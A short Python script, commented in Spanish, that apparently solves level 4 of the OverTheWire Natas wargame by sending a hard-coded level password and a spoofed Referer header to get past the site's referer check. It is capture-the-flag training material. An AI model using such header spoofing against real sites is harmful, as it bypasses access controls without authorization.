import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

# Creamos la sesión con requests

s = requests.Session()

#Hacemos la autenticación en el sitio

s.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')

#Modificamos las cabeceras que necesitamos

s.headers.update({'referer':referer})

#Hacemos la solicitud al servidor

r = s.get(url)

print(r.text)